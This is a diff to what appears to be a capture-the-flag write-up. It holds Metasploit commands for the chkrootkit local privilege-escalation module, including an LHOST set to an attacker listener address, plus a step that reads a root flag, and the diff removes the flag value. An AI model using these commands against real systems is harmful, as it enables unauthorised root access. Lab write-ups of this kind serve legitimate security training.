@@ -74,7 +74,7 @@ Metasploit module available: `exploit/unix/local/chkrootkit`
 use exploit/unix/local/chkrootkit
 set CHKROOTKIT /bin/chkrootkit
 set SESSION 1
-set LHOST <attacker_ip>
+set LHOST 10.4.20.178
 exploit
 ```
 
@@ -82,10 +82,6 @@ The exploit abuses how chkrootkit processes files in `/tmp` when run as root. Wh
 
 ```bash
 cat /root/flag
-```
-
-```
-9db8bf8f483ff50857f26f9bd636bed6
 ```
 
 ---
